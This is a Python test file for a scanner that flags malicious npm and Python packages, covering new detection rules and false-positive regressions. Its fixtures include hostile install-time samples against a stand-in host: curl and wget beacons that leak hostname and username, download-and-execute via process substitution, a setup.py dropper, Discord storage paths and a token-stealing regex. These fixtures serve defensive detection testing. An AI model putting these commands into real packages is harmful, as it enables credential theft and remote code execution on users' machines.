"""Rule set v4: gaps found on real malicious packages. Each v4 rule has a positive test (v3 misses it, v4 catches it)
and the false-positive mistakes made while building v4 have negative tests so they cannot return."""

from __future__ import annotations

from tests.conftest import rule_ids


def _npm(js: str, scripts: str = '"postinstall":"node i.js"', extra: dict | None = None):
    files = {"package.json": '{"name":"x","version":"1.0.0","scripts":{%s}}' % scripts, "i.js": js}
    files.update(extra or {})
    return files


# ---------------------------------------------------------------- aliased / inline / destructured network calls
ALIASED = "const h = require('https');\nconst os = require('os');\nh.get('https://c2.example/?h=' + os.hostname());\n"
INLINE = "const os = require('os');\nrequire('https').get('https://c2.example/?h=' + os.hostname());\n"
DESTRUCTURED = "const { get } = require('https');\nconst os = require('os');\nget('https://c2.example/?h=' + os.hostname());\n"


def test_aliased_inline_and_destructured_network_calls_form_a_beacon_in_v4_only(scan):
    for js in (ALIASED, INLINE, DESTRUCTURED):
        assert "JS-BEACON" not in rule_ids(scan(_npm(js), "npm", rules=3)), js
        assert "JS-BEACON" in rule_ids(scan(_npm(js), "npm", rules=4)), js


def test_destructured_name_is_only_a_network_call_when_it_came_from_http(scan):
    benign = "const { get } = require('lodash');\nget({a: 1}, 'a');\nconst os = require('os');\nos.hostname();\n"
    assert "JS-BEACON" not in rule_ids(scan(_npm(benign), "npm", rules=4))


def test_alias_to_child_process_is_not_treated_as_network_egress(scan):
    js = "const cp = require('child_process');\nconst os = require('os');\ncp.get && os.hostname();\n"
    assert "JS-BEACON" not in rule_ids(scan(_npm(js), "npm", rules=4))


# ------------------------------------------------------------------------------------- shell beacons and substitution
def test_install_script_beacon_with_host_identity_v4_only(scan):
    for cmd in ("curl http://c2.example/$(whoami)", "wget -q http://c2.example/?u=$USER -O /dev/null",
                "nslookup $(hostname).c2.example", "whoami | curl -d @- http://c2.example"):
        pj = {"package.json": '{"name":"x","version":"1.0.0","scripts":{"preinstall":"%s"}}' % cmd.replace('"', "'"), "index.js": "1"}
        assert "SH-BEACON" not in rule_ids(scan(pj, "npm", rules=3)), cmd
        assert "SH-BEACON" in rule_ids(scan(pj, "npm", rules=4)), cmd


def test_beacon_pattern_is_ignored_in_runtime_shell_scripts(scan):
    """Mistake made while building v4: a legitimate build script using curl with $(...) was flagged."""
    files = {"package.json": '{"name":"x","version":"1.0.0"}', "index.js": "1",
             "scripts/release.sh": "#!/bin/sh\ncurl -s https://api.example/v/$(cat VERSION)\n"}
    assert "SH-BEACON" not in rule_ids(scan(files, "npm", rules=4))


def test_process_substitution_download_exec(scan):
    for cmd in ("bash <(curl -s http://c2.example/x)", "source <(wget -qO- http://c2.example/x)"):
        pj = {"package.json": '{"name":"x","version":"1.0.0","scripts":{"postinstall":"%s"}}' % cmd, "index.js": "1"}
        assert "SH-DOWNLOAD-EXEC-SUBST" not in rule_ids(scan(pj, "npm", rules=3))
        assert "SH-DOWNLOAD-EXEC-SUBST" in rule_ids(scan(pj, "npm", rules=4))


def test_plain_network_tool_at_install_is_only_a_weak_signal(scan):
    pj = {"package.json": '{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl -fsSL https://example.org/tool.tgz -o tool.tgz"}}', "index.js": "1"}
    r = scan(pj, "npm", rules=4)
    assert "SH-NETWORK-AT-INSTALL" in rule_ids(r) and r.verdict == "benign"


# --------------------------------------------------------------------------------------------- python additions
def test_os_startfile_after_a_download_is_a_dropper_at_install_time(scan):
    setup = ("from setuptools import setup\nimport os, urllib.request\n"
             "urllib.request.urlretrieve('http://c2.example/a.exe', 'a.exe')\nos.startfile('a.exe')\nsetup(name='x')\n")
    assert scan({"setup.py": setup}, rules=3).verdict == "benign"
    assert "PY-FETCH-AND-RUN" in rule_ids(scan({"setup.py": setup}, rules=4))


def test_package_init_beacon_across_functions_is_caught_in_v4(scan):
    init = ("import socket, urllib.request\n\ndef ident():\n    return socket.gethostname()\n\n"
            "def send(x):\n    urllib.request.urlopen('http://c2.example/?h=' + x)\n\nsend(ident())\n")
    files = {"pkg/__init__.py": init}
    assert "PY-BEACON-FILE" in rule_ids(scan(files, rules=4))


def test_credential_constants_in_an_init_file_do_not_combine_with_a_network_helper(scan):
    """Mistake made while building v4: a security-scanner library listing sensitive paths was flagged as a stealer."""
    init = ('import requests\nPATHS = ["~/.ssh/id_rsa", "~/.aws/credentials"]\n\n'
            'def fetch(url):\n    return requests.get(url, timeout=5).text\n')
    assert scan({"pkg/__init__.py": init}, rules=4).verdict == "benign"


# ------------------------------------------------------------------------------- stealer paths and token regexes
def test_stealer_paths_must_look_like_paths_not_bare_words(scan):
    """Mistake made while building v4: 'leveldb', 'local storage' and 'tdata' appear in ordinary libraries."""
    js = ("const https = require('https');\n// uses localStorage and leveldb and tdata in documentation\n"
          "https.get('https://api.example/');\nconst os = require('os');\nos.hostname();\n")
    assert "JS-EXFIL" not in rule_ids(scan(_npm(js), "npm", rules=4))


def test_chrome_and_discord_storage_paths_with_network_egress_are_flagged_in_v4(scan):
    js = ("const https = require('https');\nconst fs = require('fs');\n"
          "const p = process.env.APPDATA + '\\\\discord\\\\Local Storage\\\\leveldb';\n"
          "https.request({hostname: 'c2.example'});\n")
    assert "JS-EXFIL" in rule_ids(scan(_npm(js), "npm", rules=4))


def test_discord_token_regex_is_flagged_in_both_languages(scan):
    rx = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"
    py = scan({"pkg/__init__.py": f'import re\nTOKEN = re.compile(r"{rx}")\n'}, rules=4)
    js = scan(_npm(f"const t = /{rx}/g;\n"), "npm", rules=4)
    assert "PY-TOKEN-STEALER" in rule_ids(py) and "JS-TOKEN-STEALER" in rule_ids(js)
    assert "PY-TOKEN-STEALER" not in rule_ids(scan({"pkg/__init__.py": f'import re\nTOKEN = re.compile(r"{rx}")\n'}, rules=3))
